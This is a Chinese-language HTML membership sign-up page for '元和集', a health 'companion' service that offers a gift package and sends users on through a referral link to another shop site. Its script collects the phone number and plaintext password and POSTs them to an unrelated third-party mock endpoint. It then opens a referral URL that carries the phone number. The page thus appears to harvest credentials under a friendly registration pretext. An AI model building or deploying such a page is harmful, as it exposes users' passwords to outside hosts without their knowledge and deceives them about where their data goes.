<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>元和集·会员注册中心</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      color: #333;
    }
    .container {
      max-width: 500px;
      margin: 50px auto;
      background: white;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 {
      margin-bottom: 10px;
      color: #1a1a1a;
    }
    p {
      color: #666;
      font-size: 15px;
    }
    .step {
      margin: 30px 0;
    }
    .step-title {
      font-weight: bold;
      margin-bottom: 10px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    .button {
      display: inline-block;
      padding: 12px 24px;
      margin: 10px 0;
      background-color: #24c29a;
      color: white;
      text-decoration: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #1ea885;
    }
    .tips {
      font-size: 12px;
      color: #999;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>欢迎加入元和集</h1>
    <p>我们为您提供专业的陪跑式健康服务，产品由官方平台提供，您可通过下方入口注册并领取专属礼包</p>

    <div class="step">
      <div class="step-title">第一步：注册元和集陪跑会员</div>
      <form id="myForm">
        <input type="text" id="phone" placeholder="请输入手机号" required />
        <input type="password" id="password" placeholder="请输入设置密码" required />
        <button type="submit" class="button">提交注册</button>
      </form>
    </div>

    <div class="step">
      <div class="step-title">第二步：注册成功后，开通礼包</div>
      <a id="giftBtn" href="http://blx.longliqi.com/goodDetail.html?goods_id=203" target="_blank" class="button" style="display:none;">→ 前往领取礼包</a>
    </div>

    <div class="tips">
      * 元和集提供专业陪跑与服务支持，实际产品与发货由倍莱鲜官方平台提供。<br>
      * 请先注册完成，再点击上方按钮领取礼包，确保权益绑定无误。
    </div>
  </div>

  <script>
    document.getElementById("myForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const password = document.getElementById("password").value;

      if (!/^1[3-9]\d{9}$/.test(phone)) {
        alert("请输入有效的手机号");
        return;
      }

fetch("https://run.mocky.io/v3/55fd0664-4b79-41eb-9f7d-27cd3182eb13", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ phone, password })
      }).then(() => {
        alert("注册成功！接下来将跳转至官方会员系统完成产品激活...");
        setTimeout(() => {
          window.open(`http://blx.longliqi.com/register.html?referee_id=1749824&mobile=${encodeURIComponent(phone)}`, '_blank');
          document.getElementById("giftBtn").style.display = 'inline-block';
        }, 1000);
      }).catch(() => {
        alert("注册失败，请稍后再试");
      });
    });
  </script>
</body>
</html>
